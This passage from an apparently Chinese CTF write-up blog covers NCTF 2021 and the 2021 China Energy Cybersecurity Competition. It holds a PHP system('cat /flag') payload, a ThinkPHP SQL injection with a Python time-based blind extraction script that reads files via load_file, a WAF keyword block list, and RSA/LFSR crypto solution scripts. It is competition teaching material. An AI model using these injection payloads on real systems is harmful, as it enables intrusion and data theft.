<code>&lt;?php%20system(&quot;cat /flag&quot;);?&gt;</code> 拿到flag：<code>nctf&#123;m1saka_wanna_kaibai&#125;</code>。</p><p>​    </p><h3 id="摆就完事了2-0"><a href="#摆就完事了2-0" class="headerlink" title="摆就完事了2.0"></a>摆就完事了2.0</h3><blockquote><p>卷起来 不准摆！</p></blockquote><p>版本同上，改了逻辑，未开启强制路由RCE漏洞无效。</p><p><code>www.zip</code> 下载源码，发现控制器 <code>applicaion/index/controller/M1sakaM1yuu.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: m1saka<span class="doctag">@x</span>1ct34m</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span>: www.m1saka.love</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/system| |\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">M1sakaM1yuu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$username</span> = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = implode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span> (waf(<span class="variable">$str</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg&quot; alt=&quot;hutao&quot; /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>)&#123;</span><br><span class="line">db(<span class="string">&#x27;m1saka&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;啊对对对&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;说什么我就开摆&#x27;</span>;<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照ThinkPHP控制器语法，GET方式传入 <code>username</code> 参数值（本地部署，开启debug调试功能测试）：</p><p> <code>http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username=xxx</code> 正常回显 <code>啊对对对</code>。</p><p>后续控制 <code>username</code> 参数值，绕过waf，实现insert注入：</p><p><code>http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((substr((select(&quot;admin&quot;)),16,1)=&quot;n&quot;),sleep(3),0)</code></p><p>替换为时间盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if((ascii(substr((select(load_file(&quot;/var/www/html/ffllaagg.php&quot;))),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),sleep(0.6),0)&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>得到flag：<code>nctf&#123;m1saka_wanna_marry_liyuu_&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Hello-せかい"><a href="#Hello-せかい" class="headerlink" title="Hello せかい"></a>Hello せかい</h3><blockquote><p>欢迎来到NCTF-逆向工程(Reverse Engineering)<br>这里可能有你需要的工具:<br>ida pro 7.6 :链接：<a href="https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg">https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg</a> 提取码：o49x</p></blockquote><p>IDA打开，查找字符串，发现flag：<code>NCTF&#123;We1come_2_Reverse_Engineering&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;比赛时间：2021.11.27 9:00-2021.11.28 21:00&lt;/li&gt;
&lt;li&gt;比赛区分校内校外，比赛结束后结算分别排名，比赛时排行榜不区分&lt;/li&gt;
&lt;li&gt;注册队伍登陆后，请在Profile页面绑定队伍成员信息&lt;/li</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021年中国能源网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-10-15T11:39:32.000Z</published>
    <updated>2021-10-16T16:00:36.995Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安全防护的重要指示精神，落实《关键信息基础设施安全保护条例》的有关要求，全面提升我国能源行业网络安全水平，加强能源网络安全人才培养与技术交流，加快构建“清洁低碳、安全高效”的能源体系，中国能源研究会定于2021年9～11月举办2021年中国能源网络安全大赛暨中国能源网络与数据安全大会。</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e1=835967807536519622934604405063</span><br><span class="line">c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span><br><span class="line">n1=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br><span class="line">e2=885003184250422219085124964981</span><br><span class="line">c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span><br><span class="line">n2=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br></pre></td></tr></table></figure></blockquote><p>$n_1=n_2$，RSA共模攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span></span><br><span class="line">e1 = <span class="number">835967807536519622934604405063</span></span><br><span class="line">c1 = <span class="number">19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span></span><br><span class="line">e2 = <span class="number">885003184250422219085124964981</span></span><br><span class="line">c2 = <span class="number">4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#666c61677b36323462306666352d326436642d313165632d623438622d6463613930343938613264627d</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;</code></p><p>​    </p><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><blockquote><p>31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d</p></blockquote><p>先转hex得到 <code>13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code>，</p><p><code>zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code> 根据无数字1和等号特征，猜测是转小写的base32；</p><p>转回大写，由前面提示 <code>13+5</code>，rot13+base32得到 <code>fladå.Ù..Å.Í.Õ.Á.ÌÅ....Èå.ÈäÝ...Õ..Éþ</code> 出现flag头；</p><p>由于 <code>base32(&#39;flag&#123;&#39;)=MZWGCZ33</code>，数字为rot5，密文还原为 <code>MZWGCZ33HFSTMZLGGFQTGZRVMYYGKMZRMNQWIZBSHFRTEOJXMJSWMNLBMQZH2===</code>，</p><p>base32 解码得 <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code>。</p><p><strong>FLAG:</strong> <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code></p><p>​    </p><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><blockquote><p>杂七杂八密码的混合体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line">status=<span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">b&quot;flag&#123;*************&#125;&quot;</span></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">binp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">c = (<span class="built_in">pow</span>(num, e, n))</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc2&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(n)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(binp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">chr</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>LFSR + RSA高位p泄露攻击。</p><p>先模拟LFSR求出760组 <code>out</code> 01值，结合<code>enc</code>文件中01密文，异或还原 $p$ 的高760二进制位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#xx27;</span>))</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line">pp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">pp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">pp = <span class="built_in">int</span>(pp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(pp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#6064523798049644277925701126806650606472211004362096137261922023539261533931159712229993784486900304494092698035668254711607734547323493716579247168129613825017402250081444943555723771998431425098683590600454956058175183022718975</span></span><br></pre></td></tr></table></figure><p>利用coppersmith攻击方法，进行已知 $p$ 高位攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">20929902170717676951934620006433003604730678640645007075637305655990838672444304031857412581445836654784941618387885677741424195646067710979291690749949226354601059943673546892769474380805413381477209725509187761202889007557157174009816759858206190915193870770303140668513899480840368042056977078850633645939996806974754076338446182094408033833859119883893893710390855924917625801146138452249766835457952331243832878453385608344187234621288871394907683956060567710199168220435234555727645472494418988488158424284566395402382371954247354264148359024995803494283148151292240772247688313806712633140618802681063347059301</span></span><br><span class="line">p4 = <span class="number">6020793003600505515657431119157212393365966944447518390323900168965824649782228689680274668164250924439790546808885513956693311045291390596152861670602514965058376230082977010070282487901715757886308848763512028412503942684262007</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>+<span class="built_in">str</span>(n//p))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line"><span class="comment">#q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br></pre></td></tr></table></figure><p>最后常规RSA解 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line">q = <span class="number">117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12381638589055841139447839302795029653843309313978198727914736718245700098003130043532117734105184556347388175236916768083364314767482249333410320774565764577094924964983543424785959666191716662886118558538365503080964047183533841342232120086245448689762948846598689811062301086591078119426971029385906936610191899748366808606594184238261341160458933596780268681004577561284530512291876043524269456261191856680575840859843145591670082313114482813697656520320677074240863479192424768989294287655231041605257414144367688426659163486702611196512549549115716697786311455783534600599360245502989232358699920442842821956230</span></span><br><span class="line">d = gmpy2.invert(e, fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;th1s_ls_4_eZ_quEST1on&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;th1s_ls_4_eZ_quEST1on&#125;</code></p><p>​    </p><h3 id="NumberGame"><a href="#NumberGame" class="headerlink" title="NumberGame"></a>NumberGame</h3><blockquote><p>数字的游戏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=65537</span><br><span class="line">(p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span><br><span class="line">c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span><br><span class="line">invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span><br><span class="line">invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span><br></pre></td></tr></table></figure></blockquote><p>给出 $(p-1)(q-1),x=\text{inv}(p,q),y=\text{inv}(q,p),e,c$。</p><p>详细推导思路可参考 <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>。</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 